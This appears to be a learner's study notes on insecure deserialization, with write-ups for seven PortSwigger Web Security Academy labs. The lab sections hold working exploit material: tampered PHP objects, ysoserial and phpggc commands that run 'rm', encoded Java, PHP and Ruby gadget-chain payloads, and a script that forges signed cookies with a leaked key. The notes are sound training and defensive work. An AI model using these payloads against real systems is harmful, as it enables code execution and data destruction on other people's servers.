# Insecure Deserialization

> PortSwigger Web Security Academy · **7/10** labs completed

Insecure deserialization happens when an application rebuilds objects from untrusted data. Attackers can change object values or trigger gadget chains that lead to code execution.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [Concept notes](#concept-notes)
- [1. Modifying serialized objects](#1-modifying-serialized-objects)
- [2. Modifying serialized data types](#2-modifying-serialized-data-types)
- [3. Using application functionality to exploit insecure deserialization](#3-using-application-functionality-to-exploit-insecure-deserialization)
- [4. Arbitrary object injection in PHP](#4-arbitrary-object-injection-in-php)
- [5. Exploiting Java deserialization with Apache Commons](#5-exploiting-java-deserialization-with-apache-commons)
- [6. Exploiting PHP deserialization with a pre-built gadget chain](#6-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
- [7. Exploiting Ruby deserialization using a documented gadget chain](#7-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Find where serialized data appears: cookies, hidden form fields, cache values, 'ViewState'-style blobs — look for Base64, hex, or a recognizable format (PHP `O:`, Java `rO0`, Python pickle).
- Decode it to see the structure, then try modifying a simple value (a role, a flag, a price) and re-encode it to test whether the server trusts it unverified.
- Check whether a signature/MAC protects the blob, and whether it's actually validated before deserializing (not just present).
- If you control the type/class being instantiated, look for 'gadget chains' in the app's dependencies — known classes whose magic methods (`__wakeup`, `__destruct`, `readObject`) chain into a dangerous sink.
- Use existing public gadget-chain tooling for the language/framework in use (e.g. `ysoserial` for Java, `phpggc` for PHP) rather than building a chain from scratch where a known one exists.
- For blind deserialization (no visible effect), use an out-of-band channel (DNS/HTTP callback) triggered by the gadget chain to confirm execution.

## Concept notes

### Deserialization checklist

- Inspect cookies and HTTP parameters for serialized data.
- Identify Base64, hexadecimal or URL encoding layers
- Identify the underlying serialization format.
- Determine whether the application accepts modified serialized data.
- Test whether object properties can be manipulated
- Check whether security-sensitive fields influence authorization.
- Investigate class information and available object types
- Identify relevant magic methods and callbacks.
- Look for possible gadget chains in available dependencies.
- Use safe out-of-band techniques when testing blind deserialization.
- Check whether integrity verification happens before deserialization.
- Evaluate impact and confirm it with reproducible evidence.

### gadgets

- kickoff- this is the first gadget-typically the magic methods
- intermediate- methods that pass data or control execution to other methods
- sink- this is the final endpoint which does the sensitive operation- system(),exec(),file_put_contents()unlink(),include()

### how to create custom gadgets

- Find the deserialization entry points like unserialize,ObjectInputStream readobject(),pickle.loads()
- Identify available classes
- Find kick off gadgets
- For PHP:

```
__wakeup()
__unserialize()
__destruct()
```

For Java:

```
readObject()
readResolve()
```

- Follow method calls
- Track attacker controlled data
- Identify the sink

### how to investigate insecure deserialization

| Priority | Investigation                                      |
| -------- | -------------------------------------------------- |
| 1        | Identify the serialization format                  |
| 2        | Find the deserialization entry point               |
| 3        | Determine whether the input is attacker-controlled |
| 4        | Identify the application language and framework    |
| 5        | Identify available classes and dependencies        |
| 6        | Search for magic methods and callbacks             |
| 7        | Trace object properties and method calls           |
| 8        | Identify potential sinks                           |
| 9        | Check for documented gadget chains                 |
| 10       | Test safely and establish impact                   |
### preventions

1. **Avoid deserializing untrusted input** – Prevents attackers from supplying malicious serialized objects that trigger dangerous methods or gadget chains.

2. **Use JSON instead of native object serialization** – Reduces the risk of arbitrary method execution during object reconstruction. Validate the JSON schema and input fields.

3. **Verify HMAC signatures before deserialization** – Ensures serialized data has not been modified and comes from a trusted source. Never deserialize before verifying the signature.

4. **Implement strict class allowlists** – Restricts deserialization to approved classes, reducing the possibility of instantiating dangerous objects.

5. **Use Java** `ObjectInputFilter` **and PHP** `allowed_classes` – Restricts permitted classes and object structures, reducing the attack surface. These are defense-in-depth measures, not complete solutions.

6. **Avoid dangerous magic methods and deserialization callbacks** – Prevents attackers from triggering sensitive operations during deserialization, such as file deletion, file writing, or command execution.

7. **Keep frameworks and third-party libraries updated** – Fixes known vulnerabilities and removes exposure to publicly documented gadget chains.

8. **Store sensitive session data on the server** – Prevents attackers from modifying serialized session objects through client-controlled cookies or request parameters.

9. **Apply resource limits and input validation** – Restricts object depth, size, and structure to reduce resource-exhaustion attacks and unexpected object states.

10. **Apply least privilege and restrict filesystem/network access** – Limits the damage if an attacker successfully exploits deserialization to execute commands, access files, or perform SSRF.

## Lab write-ups

### 1. Modifying serialized objects

**Lab:** [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

- In this lab the session cookie has the vuln
- When I inspect the cookie and it is url encoded and the decoded message tells that admin is set to 0. so I changed it from 0 to 1 and I got the admin access
- `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`
- Then I modified session cookie from 0 to 1 and the pass endpoint `/admin/delete?username=carlos` to delete the account

---

### 2. Modifying serialized data types

**Lab:** [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

- In this lab there is a vuln in changing the datatype
- First we will inspect the session
- First I changed the username from wiener to administrator and it throws an error telling the access token is invalid
- Then I removed the whole token and changed the length from 32 to s:0 and it stills gives me an error failed deserialization
- Then I changed the datatype from s to I:0; and now I was able to get the access of admin
- The reason behind validating the token even though we removed the token and sets the length to 0, php version which is 7 and earlier gives the result to be true for anything which has length 0 and empty string, so this will be like `0=="empty"->true`, and that is the reason it is validating the token
- `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
- Now change the path to `/admin/delete?username=carlos` to delete the account

---

### 3. Using application functionality to exploit insecure deserialization

**Lab:** [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

- In this lab the vuln exists in the delete functionality
- There is a option to delete our account and the endpoint which should be deleted is attached in the session and it should get deserialized.
- So change the endpoint from `/users/delete/wiener` to `/home/carlos/morale.txt` so that the file gets deleted with your account
- `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wj0myt9x57728vqgmzgj2h7jjwlw53ni";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
- So the above payload is used to delete the file from carlos's directory

---

### 4. Arbitrary object injection in PHP

**Lab:** [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

- In this lab we have to use the magic methods
- Magic methods are the methods which will invoke automatically when a class is created like when we create a class, `__init__` will be invoked
- So we have to use it
- First go to sitemap which is there under target and there will be a file under /libs which is customtemplate.php
- Send the file to the repeater and add `~` at the end of the filename and now you will be able to see the source code of it
- There is a magic method here which is `__destruct` which is used in php to cleanup the resources and delete the objects
- So the file exists in lock_file_path for carlos and now we need to create a serialized data so that we can add it to a cookie and execute it
- To create a cookie, we need to set the object to customTemplate because it is the class name, then map the lock_file_path to /home/carlos/morale.txt to delete it
- `o:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
- Now base64 encode and url encode it
- base64 encode is `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==`
- url encode is `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`
- Now load the home page and replace the above payload instead of cookie to finish the lab

---

### 5. Exploiting Java deserialization with Apache Commons

**Lab:** [Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

- This lab uses java deserialization and we need to delete the morale.txt file from carlos
- To do that the hint has given the code to do it, to generate the base64 url encoded token. we will do that using the tool called `ysoserial`
- The code is

```bash
java \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ -jar ysoserial-all.jar [payload] '[command]'
```

- Code we used for creating the specific payload

```bash
java \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

- We will run the code and we will get the base 64 encoded code. copy the code and replace it with the cookie and url encode and send the request
- The payload is

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABq7K/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXIxMTU3NDUzNTAzNjExNwEAH0x5c29zZXJpYWwvUHduZXIxMTU3NDUzNTAzNjExNzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+AB8AAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA%3d%3d
```

---

### 6. Exploiting PHP deserialization with a pre-built gadget chain

**Lab:** [Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

- So in this lab we have to find the gadget
- First we will login to our account and see the cookie and it uses hmac signing and if I try to send the request with modified cookie I will get an error and it exposes the version which is `symfony version:4.3.6`
- There is a file in sitemap called /cgi-bin/phpinfo.php and when I open the file, it exposes the secret key which is used to sign the cookie
- The key is `l8rarx9vskjt63e369gxw10jaloljydk`
- Now we need to create the object to delete morale.txt and to do that we will use the tool called phpggc which we can download it from github- ` git clone https://github.com/ambionics/phpggc.git`
- Now we will go inside the folder called `cd phpggc` and we will run the below command to get the object in base64 encoded
- `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0`
- Now we got the object and the next step is to create a valid cookie using the object we have and the secret key we got it from the php file
- The object is `Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==`
- To do that we will do that using a php file
- The php code is

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
$secretKey = "l8rarx9vskjt63e369gxw10jaloljydk";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

- We have put the object and the secret key we got and we are creating a signed cookie
- We got the signed cookie and the cookie is

```
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22e5a5f66ceecb496dd015570626abd3a8c6c0ba33%22%7D
```

- Now replace the cookie and send the request and you will finish the lab

---

### 7. Exploiting Ruby deserialization using a documented gadget chain

**Lab:** [Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

- In this lab it is using ruby so we need to search for ruby deserialization gadget and there will be a site called devcraft.io
- Get the final payload from there and modify the file path from `/home/carlos/morale.txt` to rm it and build the cookie using the command -`odman run --rm -v "$PWD":/app -w /app docker.io/library/ruby:2.7 ruby generate.rb > cookie.txt`
- Now we got the cookie, replace the cookie with it and finish the lab

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Do not deserialize untrusted data. Use plain data formats such as JSON with schema validation.
- Sign serialized data (HMAC) and verify the signature before deserializing.
- Use class allowlists such as Java `ObjectInputFilter` and PHP `allowed_classes`.
- Keep libraries updated, because most exploits use gadget chains from known dependencies.
- Keep sensitive session state on the server, and run with least privilege.
